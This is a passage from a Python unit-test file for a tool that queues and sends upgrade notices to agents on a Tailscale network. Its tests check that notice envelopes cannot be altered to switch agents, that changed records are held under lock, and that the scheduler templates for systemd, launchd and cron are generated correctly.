        self.assertEqual({"invalid": 1}, json.loads(out.getvalue())["notices"])

    def test_pending_envelope_cannot_switch_agents_or_be_regenerated(self):
        with mock.patch.object(Y, "post_notice", return_value=("not_sent", "connection refused", None)):
            self.notify("--apply")
        state = self.state()
        entry = next(iter(state["notices"].values()))
        entry["envelope"]["agent"] = "new-agent"
        Y.write_json_atomic(self.home / "upgrade-notices.json", state)
        self.maintain("--apply")
        self.assertEqual([], self.bravo.posts)
        self.assertEqual("uncertain", self.entry("bravo")["status"])
        entry["status"] = "pending"
        entry.pop("envelope")
        Y.write_json_atomic(self.home / "upgrade-notices.json", state)
        self.maintain("--apply")
        self.assertEqual([], self.bravo.posts)
        self.assertEqual("uncertain", self.entry("bravo")["status"])

    def test_record_changed_after_plan_is_held_under_lock(self):
        self.queue_offline()
        f = Y.gather_versions(self.home, "--home")
        nodes, _ = Y.tailnet_nodes(f["cfg"]["tailscale_cmd"])
        items, keys = Y.maintenance_candidates(self.state(), nodes, VERSION)
        for c in items:
            c.update(online=True, ip="127.0.0.2")
        probes = [Y.probe_info("127.0.0.2", self.port, 1, expect_node="bravo.example.ts.net")]
        state = self.state()
        entry = next(iter(state["notices"].values()))
        entry["agent"] = "new-agent"
        Y.write_json_atomic(self.home / "upgrade-notices.json", state)
        Y.apply_notices(self.home, "alpha.example.ts.net", VERSION, items, probes, False, notice_keys=keys)
        self.assertEqual([], self.bravo.posts)

    def test_templates_opt_in_retry_and_startup_without_installing(self):
        import plistlib
        for kind in ("systemd-user", "launchd", "cron"):
            out = io.StringIO()
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
                Y.main(["--home", str(self.home), "update", "reminder-template", kind, "--retry-notices"])
            text = out.getvalue()
            if kind == "launchd":
                p = plistlib.loads(text.encode())
                self.assertEqual(900, p["StartInterval"])
                self.assertTrue(p["RunAtLoad"])
                self.assertIn("maintain", p["ProgramArguments"])
                self.assertIn("--apply", p["ProgramArguments"])
            elif kind == "systemd-user":
                self.assertIn("OnCalendar=*:0/15", text)
                self.assertIn("OnBootSec=2min", text)
                self.assertIn("Persistent=true", text)
            else:
                self.assertIn("*/15 * * * *", text)
                self.assertIn("@reboot", text)
        self.assertFalse((self.home / "upgrade-notices.json").exists())


if __name__ == "__main__":
    unittest.main()
